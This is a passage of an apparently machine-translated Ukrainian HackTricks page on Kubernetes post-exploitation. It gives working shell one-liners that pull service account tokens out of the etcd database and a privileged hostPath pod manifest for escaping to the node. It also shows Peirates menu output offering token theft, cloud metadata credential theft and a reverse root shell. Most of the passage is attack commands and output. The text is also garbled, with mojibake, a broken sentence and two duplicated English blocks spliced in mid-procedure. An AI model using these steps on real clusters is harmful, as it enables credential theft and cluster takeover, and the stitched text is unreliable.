–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ —à–≤–∏–¥–∫–∏–π —ñ –Ω–µ—á–µ—Å–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—Ç—è–≥—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏ –∑ `etcd`, —è–∫—â–æ –≤—ñ–Ω –ø—Ä–∞—Ü—é—î –Ω–∞ –≤—É–∑–ª—ñ control-plane, –Ω–∞ —è–∫–æ–º—É –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –±—ñ–ª—å—à –µ–ª–µ–≥ –≥–∞—Ä–Ω–µ —Ä—ñ—à–µ–Ω–Ω—è, —è–∫–µ –∑–∞–ø—É—Å–∫–∞—î –ø–æ–¥ –∑ —É—Ç–∏–ª—ñ—Ç–æ—é –∫–ª—ñ—î–Ω—Ç–∞ `etcd` `etcdctl` —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—É–∑–ª–∞ control-plane –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ etcd, –¥–µ –± –≤—ñ–Ω –Ω–µ –∑–∞–ø—É—Å–∫–∞–≤—Å—è, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [—Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥–Ω–∏–π —Ñ–∞–π–ª](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) –≤—ñ–¥ @mauilion.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –ø—Ä–∞—Ü—é—î `etcd` –Ω–∞ –≤—É–∑–ª—ñ control-plane —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –±–∞–∑–∞ –¥–∞–Ω–∏—Ö (—Ü–µ –Ω–∞ –∫–ª–∞—Å—Ç–µ—Ä—ñ, —Å—Ç–≤–æ—Ä–µ–Ω–æ–º—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section explores various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes environment.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

If the attacker can identify misconfigured Role-Based Access Control (RBAC) roles within the cluster, they may be able to escalate their privileges to perform actions they are not authorized to do. This can include accessing sensitive resources or modifying critical components of the cluster.

#### Accessing the Kubernetes API Server

By accessing the Kubernetes API server from within a compromised pod, an attacker can potentially interact with the cluster in unintended ways. This could allow them to create or delete resources, view configuration details, or even launch additional pods with malicious intent.

### Lateral Movement

#### Pod Hopping

Once inside a pod, an attacker can move laterally by hopping from one pod to another within the same node or across different nodes in the cluster. This can help them evade detection and expand their reach within the Kubernetes environment.

#### Exploiting Service Accounts

Service accounts are used by pods to authenticate and communicate with the Kubernetes API server. If an attacker compromises a pod with elevated service account privileges, they can leverage this access to move laterally and perform unauthorized actions across the cluster.

### Conclusion

Securing Kubernetes pods is crucial to prevent attackers from exploiting vulnerabilities and moving laterally within the cluster. By understanding these attack techniques, security professionals can better defend against such threats and ensure the integrity of their Kubernetes environments.
```
```bash
data-dir=/var/lib/etcd
```
**–ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –¥–∞–Ω—ñ –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**–í–∏—Ç—è–≥–Ω—ñ—Ç—å —Ç–æ–∫–µ–Ω–∏ –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —Ç–∞ –ø–æ–∫–∞–∂—ñ—Ç—å —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**–¢–∞ –∂ –∫–æ–º–∞–Ω–¥–∞, –∞–ª–µ –∑ –¥–µ—è–∫–∏–º–∏ greps, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –ª–∏—à–µ —Ç–∏–ø–æ–≤–∏–π —Ç–æ–∫–µ–Ω —É –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are already inside the cluster and can potentially access other pods and services. This section explores various techniques an attacker can use to escalate privileges and move laterally within a Kubernetes cluster.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

If the attacker can find a misconfigured Role-Based Access Control (RBAC) role that grants more permissions than necessary, they can abuse it to escalate their privileges within the cluster.

#### Accessing the Kubernetes API

By accessing the Kubernetes API from inside a pod, an attacker can gather information about the cluster, modify resources, and perform other malicious activities.

### Lateral Movement

#### Pod Hopping

Once inside a pod, an attacker can use various techniques to move laterally within the cluster, such as accessing the API server, compromising other pods, or exploiting misconfigurations.

#### Service Account Compromise

If the attacker compromises a pod's service account token, they can impersonate the account and potentially access other resources within the cluster.

### Conclusion

Securing Kubernetes clusters from insider threats is crucial to prevent unauthorized access and data breaches. Regularly auditing RBAC roles, monitoring pod activities, and securing service accounts are essential steps to enhance Kubernetes security.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### –°—Ç–∞—Ç–∏—á–Ω–∞/–î–∑–µ—Ä–∫–∞–ª—å–Ω–∞ –ü–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å –ü–æ–¥—ñ–≤

_–°—Ç–∞—Ç–∏—á–Ω—ñ –ü–æ–¥–∏_ –∫–µ—Ä—É—é—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–µ–º–æ–Ω–æ–º kubelet –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤—É–∑–ª—ñ, –±–µ–∑ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è API-—Å–µ—Ä–≤–µ—Ä–∞ –∑–∞ –Ω–∏–º–∏. –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ –ü–æ–¥—ñ–≤, —è–∫—ñ –∫–µ—Ä—É—é—Ç—å—Å—è –ø–ª–∞–Ω–æ–º —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è (–Ω –í—ñ–¥–¥—ñ–ª–µ–Ω–Ω—è); –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ, **kubelet —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ –∫–æ–∂–Ω–∏–º —Å—Ç–∞—Ç–∏—á–Ω–∏–º –ü–æ–¥–æ–º** (—ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—î –π–æ–≥–æ —É —Ä–∞–∑—ñ –Ω–µ–≤–¥–∞—á—ñ).

–û—Ç–∂–µ, —Å—Ç–∞—Ç–∏—á–Ω—ñ –ü–æ–¥–∏ –∑–∞–≤–∂ Norris **—Ä –ü –í E –≤,
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### –í–∏–¥–∞–ª–µ–Ω–Ω—è pods + –≤–∏–º–∫–Ω–µ–Ω–Ω—è nodes

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–∑–ª–∞–º–∞–≤ node** —ñ –º–æ–∂–µ **–≤–∏–¥–∞–ª—è—Ç–∏ pods** –∑ —ñ–Ω—à–∏—Ö nodes —ñ **–∑—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à—ñ nodes –Ω–µ—Å–ø—Ä–æ–º–æ–∂–Ω–∏–º–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ pods**, —Ç–æ pods –±—É–¥—É—Ç—å –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω—ñ –Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É node, —ñ –≤—ñ–Ω –∑–º–æ–∂–µ **–≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∏**, —è–∫—ñ –≤ –Ω–∏—Ö –∑–∞–ø—É—â–µ–Ω—ñ.\
–î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ —Ü–∏–º–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º–∏**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ –≥—Ä—É–ø–∏ [**telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
